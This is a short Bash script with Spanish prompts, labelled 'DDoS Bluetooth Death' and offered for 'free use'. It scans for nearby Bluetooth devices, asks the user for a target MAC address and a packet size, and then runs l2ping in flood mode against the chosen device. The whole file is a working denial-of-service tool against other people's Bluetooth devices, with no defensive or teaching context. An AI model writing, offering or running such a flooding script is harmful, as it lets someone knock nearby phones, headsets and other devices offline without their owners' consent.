#!/bin/bash -x
echo ""
echo -e "\e[32m[+]\e[0m DDoS Bluetooth Death "
echo -e "                       \e[33m  by d4rch, free use!\e[1m"
echo""
echo -n -e "\e[36m¿Continuar ejecución de DDoS Bluetooth Death? [s/n]:\e[0m "
read option

if [ "$option" = 's' ]; then
    echo ""
    echo -e "\e[32m[+]\e[0m Bluetooth Death iniciado!"
    echo -e "\e[32m[+]\e[0m Asegúrate de tener el controlador activado y funcionando"
    sudo /usr/sbin/rfkill unblock bluetooth
    echo ""
    sudo /usr/sbin/rfkill
    echo ""
    echo -n -e "\e[36m[*]\e[0m Nombre de la interfaz Bluetooth (hciconfig): "
    read name_interface
    echo ""
    sudo /usr/bin/hcitool scan
    echo ""
    echo -n -e "\e[36m[*]\e[0m Dirección MAC a atacar: "
    read mac_atacar
    echo ""
    echo -n -e "\e[36m[*]\e[0m Tamaño del paquete de ping en bytes: "
    read ping_pakage
    echo ""
    echo -n -e "\e[36m[*]\e[0m Cuando desees detenerlo, presiona Ctrl + C, ¿ok? [ok]: "
    read ok_continue
    echo ""
    if [ "$ok_continue" = 'ok' ]; then
        sudo /usr/bin/l2ping -i "$name_interface" -s "$ping_pakage" -f "$mac_atacar"
    fi
elif [ "$option" = 'n' ]; then
    echo ""
    echo -e "\e[32m[+]\e[0m Programa cerrado!"
    echo ""
    exit 0
else
    echo ""
    echo -e "\e[31m[-]\e[0m Opción no válida!"
    exit 1
fi
